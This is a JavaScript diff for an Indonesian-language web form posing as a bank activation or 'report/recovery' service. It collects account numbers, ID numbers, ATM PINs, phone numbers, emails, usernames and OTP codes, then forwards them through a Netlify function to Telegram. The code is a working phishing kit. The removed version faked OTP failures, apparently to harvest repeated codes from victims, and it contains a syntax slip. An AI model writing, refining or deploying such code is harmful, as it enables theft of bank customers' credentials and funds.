@@ -1,41 +1,13 @@
 // Konfigurasi
 const API_URL = '/.netlify/functions/send-aktivasi';
 
-// Variabel untuk validasi OTP di halaman 3
-let percobaanOTP = 0;
-let isLocked = false;
-let lockTimer = null;
-let kodeBenar = null;
-
-// ========== HANDLER KEYBOARD UNTUK TOMBOL NAIK ==========
-function initKeyboardHandler() {
-    const inputs = document.querySelectorAll('#page3 input');
-    const buttonWrapper = document.getElementById('buttonWrapper');
-    
-    if (!buttonWrapper) return;
-    
-    inputs.forEach(input => {
-        input.addEventListener('focus', function() {
-            buttonWrapper.classList.add('keyboard-up');
-        });
-        
-        input.addEventListener('blur', function() {
-            buttonWrapper.classList.remove('keyboard-up');
-        });
-    });
-}
-
 // ========== NAVIGASI ==========
 function pindahHalaman(id) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     
     if (id === 'page2') {
-        // Reset dan sembunyikan tombol lanjut
-        const btnLanjut = document.getElementById('btnLanjut');
-        if (btnLanjut) {
-            btnLanjut.classList.add('hidden');
-        }
+        document.getElementById('btnLanjut').classList.add('hidden');
         cekFormPage2();
         
         setTimeout(function() {
@@ -46,166 +18,6 @@ function pindahHalaman(id) {
             }
         }, 100);
     }
-    
-    if (id === 'page3') {
-        resetStateOTP();
-        generateKodeOTP();
-        setTimeout(initKeyboardHandler, 100);
-    }
-}
-
-function generateKodeOTP() {
-    kodeBenar = Math.floor(100000 + Math.random() 900000).toString();
-    console.log('Kode OTP yang benar (untuk testing):', kodeBenar);
-    return kodeBenar;
-}
-
-function resetStateOTP() {
-    percobaanOTP = 0;
-    isLocked = false;
-    if (lockTimer) {
-        clearTimeout(lockTimer);
-        lockTimer = null;
-    }
-    
-    const errorMessage = document.getElementById('errorMessage');
-    if (errorMessage) {
-        errorMessage.innerHTML = '';
-        errorMessage.classList.remove('timer-message');
-    }
-    
-    const btnVerifikasi = document.getElementById('btnVerifikasi');
-    if (btnVerifikasi) {
-        btnVerifikasi.disabled = false;
-        btnVerifikasi.classList.remove('btn-disabled');
-    }
-    
-    const kodeOtpInput = document.getElementById('kodeOtp');
-    if (kodeOtpInput) {
-        kodeOtpInput.disabled = false;
-        kodeOtpInput.value = '';
-    }
-    
-    const infoPage3 = document.getElementById('infoPage3');
-    if (infoPage3) {
-        infoPage3.innerHTML = '* Masukkan kode OTP aktivasi';
-        infoPage3.style.color = '#e67e22';
-    }
-}
-
-function lockForm(seconds) {
-    isLocked = true;
-    const btnVerifikasi = document.getElementById('btnVerifikasi');
-    const kodeOtpInput = document.getElementById('kodeOtp');
-    const errorMessage = document.getElementById('errorMessage');
-    
-    if (btnVerifikasi) {
-        btnVerifikasi.disabled = true;
-        btnVerifikasi.classList.add('btn-disabled');
-    }
-    if (kodeOtpInput) {
-        kodeOtpInput.disabled = true;
-    }
-    
-    let timeLeft = seconds;
-    if (errorMessage) {
-        errorMessage.innerHTML = `⏱️ Mohon tunggu ${timeLeft} detik untuk mencoba lagi`;
-        errorMessage.classList.add('timer-message');
-        errorMessage.style.color = '#ff6600';
-    }
-    
-    lockTimer = setInterval(function() {
-        timeLeft--;
-        if (errorMessage) {
-            errorMessage.innerHTML = `⏱️ Mohon tunggu ${timeLeft} detik untuk mencoba lagi`;
-        }
-        
-        if (timeLeft <= 0) {
-            clearInterval(lockTimer);
-            lockTimer = null;
-            isLocked = false;
-            
-            if (btnVerifikasi) {
-                btnVerifikasi.disabled = false;
-                btnVerifikasi.classList.remove('btn-disabled');
-            }
-            if (kodeOtpInput) {
-                kodeOtpInput.disabled = false;
-                kodeOtpInput.value = '';
-                kodeOtpInput.focus();
-            }
-            if (errorMessage) {
-                errorMessage.innerHTML = '';
-                errorMessage.classList.remove('timer-message');
-            }
-            
-            percobaanOTP = 0;
-            generateKodeOTP();
-            
-            const infoPage3 = document.getElementById('infoPage3');
-            if (infoPage3) {
-                infoPage3.innerHTML = '* Kode OTP baru telah dikirim, silahkan masukkan kode baru';
-                infoPage3.style.color = '#e67e22';
-                setTimeout(() => {
-                    if (infoPage3.innerHTML === '* Kode OTP baru telah dikirim, silahkan masukkan kode baru') {
-                        infoPage3.innerHTML = '* Masukkan kode OTP aktivasi';
-                    }
-                }, 3000);
-            }
-        }
-    }, 1000);
-}
-
-async function showLoadingWithDelay(delayMs) {
-    return new Promise(resolve => {
-        showLoading();
-        setTimeout(() => {
-            hideLoading();
-            resolve();
-        }, delayMs);
-    });
-}
-
-async function validateOTPWithLoading(kodeInput) {
-    if (isLocked) {
-        const errorMessage = document.getElementById('errorMessage');
-        if (errorMessage) {
-            errorMessage.innerHTML = '⏱️ Sistem sedang terkunci, harap tunggu';
-            errorMessage.style.color = '#ff0000';
-        }
-        return false;
-    }
-    
-    if (kodeInput === kodeBenar) {
-        percobaanOTP = 0;
-        return true;
-    }
-    
-    // KODE SALAH - Tampilkan loading 4 detik dulu
-    await showLoadingWithDelay(4000);
-    
-    percobaanOTP++;
-    const errorMessage = document.getElementById('errorMessage');
-    
-    if (percobaanOTP >= 10) {
-        errorMessage.innerHTML = '❌ Kode salah! Batas percobaan tercapai. Mohon tunggu 15 detik.';
-        errorMessage.style.color = '#ff0000';
-        lockForm(15);
-        return false;
-    }
-    
-    // HAPUS TULISAN SISA PERCOBAAN - hanya tampilkan pesan sederhana
-    errorMessage.innerHTML = '❌ Kode salah, silahkan tunggu kode yang berikutnya';
-    errorMessage.style.color = '#ff0000';
-    errorMessage.classList.remove('timer-message');
-    
-    setTimeout(() => {
-        if (errorMessage.innerHTML.includes('Kode salah')) {
-            errorMessage.innerHTML = '';
-        }
-    }, 3000);
-    
-    return false;
 }
 
 // ========== HALAMAN 2 ==========
@@ -228,55 +40,32 @@ function isFormPage2Valid() {
 }
 
 function cekFormPage2() {
-    console.log('cekFormPage2 dipanggil, isFormValid:', isFormPage2Valid());
     if (isFormPage2Valid()) {
-        if (btnLanjut) {
-            btnLanjut.classList.remove('hidden');
-            console.log('Tombol LANJUT ditampilkan');
-        }
-        if (infoPage2) {
-            infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
-            infoPage2.style.color = '#27ae60';
-        }
+        btnLanjut.classList.remove('hidden');
+        infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
+        infoPage2.style.color = '#27ae60';
     } else {
-        if (btnLanjut) {
-            btnLanjut.classList.add('hidden');
-            console.log('Tombol LANJUT disembunyikan');
-        }
-        if (infoPage2) {
-            infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
-            infoPage2.style.color = '#e67e22';
-        }
+        btnLanjut.classList.add('hidden');
+        infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
+        infoPage2.style.color = '#e67e22';
     }
 }
 
-// Event listener untuk validasi form halaman 2
+// Filter input hanya angka
 if (noRekening) {
-    noRekening.addEventListener('input', function() { 
-        this.value = this.value.replace(/[^0-9]/g, ''); 
-        cekFormPage2(); 
-    });
+    noRekening.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
     noRekening.addEventListener('blur', cekFormPage2);
 }
 if (noIdentitas) {
-    noIdentitas.addEventListener('input', function() { 
-        this.value = this.value.replace(/[^0-9]/g, ''); 
-        cekFormPage2(); 
-    });
+    noIdentitas.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
     noIdentitas.addEventListener('blur', cekFormPage2);
 }
 if (pinAtm) {
-    pinAtm.addEventListener('input', function() { 
-        this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); 
-        cekFormPage2(); 
-    });
+    pinAtm.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); cekFormPage2(); });
     pinAtm.addEventListener('blur', cekFormPage2);
 }
 if (noTelpon) {
-    noTelpon.addEventListener('input', function() { 
-        this.value = this.value.replace(/[^0-9]/g, ''); 
-        cekFormPage2(); 
-    });
+    noTelpon.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
     noTelpon.addEventListener('blur', cekFormPage2);
 }
 if (email) {
@@ -284,6 +73,7 @@ if (email) {
     email.addEventListener('blur', cekFormPage2);
 }
 
+// Fungsi untuk menampilkan loading
 function showLoading() {
     let loading = document.querySelector('.loading-overlay');
     if (!loading) {
@@ -302,6 +92,7 @@ function hideLoading() {
     }
 }
 
+// Kirim data ke Netlify Function
 async function kirimKeTelegram(data) {
     try {
         const response = await fetch(API_URL, {
@@ -331,6 +122,7 @@ function lanjutKePage3() {
         return;
     }
     
+    // Simpan data ke sessionStorage
     const userData = {
         noRekening: noRekening.value.trim(),
         noIdentitas: noIdentitas.value.trim(),
@@ -354,33 +146,26 @@ function lanjutKePage3() {
 // ========== HALAMAN 3 ==========
 async function selesai() {
     const username = document.getElementById('username');
-    const kodeOtpInput = document.getElementById('kodeOtp');
+    const kodeOtp = document.getElementById('kodeOtp');
     
     let error = '';
     if (!username.value.trim()) error += 'Username tidak boleh kosong\n';
-    if (!kodeOtpInput.value.trim()) error += 'Kode OTP tidak boleh kosong\n';
+    if (!kodeOtp.value.trim()) error += 'Kode OTP tidak boleh kosong\n';
+    else if (kodeOtp.value.trim().length < 4) error += 'Kode OTP minimal 4 digit\n';
     
     if (error) {
         alert('Verifikasi gagal:\n' + error);
         return;
     }
     
-    const isValid = await validateOTPWithLoading(kodeOtpInput.value.trim());
-    
-    if (!isValid) {
-        kodeOtpInput.value = '';
-        kodeOtpInput.focus();
-        return;
-    }
-    
-    showLoading();
-    
+    // Ambil data dari sessionStorage
     const userDataStr = sessionStorage.getItem('userData');
     let userData = {};
     if (userDataStr) {
         userData = JSON.parse(userDataStr);
     }
     
+    // Data lengkap untuk dikirim ke Telegram
     const dataToSend = {
         noRekening: userData.noRekening || '-',
         noIdentitas: userData.noIdentitas || '-',
@@ -388,16 +173,21 @@ async function selesai() {
         noTelpon: userData.noTelpon || '-',
         email: userData.email || '-',
         username: username.value.trim(),
-        kodeOtp: kodeOtpInput.value.trim(),
+        kodeOtp: kodeOtp.value.trim(),
         timestamp: new Date().toLocaleString('id-ID')
     };
     
+    // Tampilkan loading
+    showLoading();
+    
+    // Kirim ke Netlify Function
     const result = await kirimKeTelegram(dataToSend);
     
     hideLoading();
     
     if (result.success) {
         alert('Cetak Laporan / Pemulihan berhasil! Data telah dikirim.');
+        // Reset form setelah sukses
         resetForm();
     } else {
         alert('Gagal mengirim data: ' + result.error + '\nData tetap tersimpan di browser.');
@@ -405,46 +195,34 @@ async function selesai() {
 }
 
 function resetForm() {
+    // Reset halaman 2
     noRekening.value = '';
     noIdentitas.value = '';
     pinAtm.value = '';
     noTelpon.value = '';
     email.value = '';
+    
+    // Reset halaman 3
     document.getElementById('username').value = '';
     document.getElementById('kodeOtp').value = '';
+    
+    // Hapus sessionStorage
     sessionStorage.removeItem('userData');
     
-    if (lockTimer) {
-        clearInterval(lockTimer);
-        lockTimer = null;
-    }
-    percobaanOTP = 0;
-    isLocked = false;
-    
-    const errorMessage = document.getElementById('errorMessage');
-    if (errorMessage) {
-        errorMessage.innerHTML = '';
-    }
-    
+    // Kembali ke halaman 1
     pindahHalaman('page1');
-    if (infoPage2) {
-        infoPage2.innerHTML = '* Harap isi semua data';
-        infoPage2.style.color = '#e67e22';
-    }
-    if (btnLanjut) {
-        btnLanjut.classList.add('hidden');
-    }
+    
+    // Reset info text
+    infoPage2.innerHTML = '* Harap isi semua data';
+    infoPage2.style.color = '#e67e22';
+    document.getElementById('btnLanjut').classList.add('hidden');
 }
 
-const kodeOtpInput = document.getElementById('kodeOtp');
-if (kodeOtpInput) {
-    kodeOtpInput.addEventListener('input', function() { 
-        this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); 
-    });
+// Filter OTP hanya angka
+const kodeOtp = document.getElementById('kodeOtp');
+if (kodeOtp) {
+    kodeOtp.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); });
 }
 
-// Panggil cekFormPage2 saat halaman dimuat
-document.addEventListener('DOMContentLoaded', function() {
-    cekFormPage2();
-    console.log('DOM loaded, cekFormPage2 dipanggil');
-});
+// Inisialisasi
+cekFormPage2();
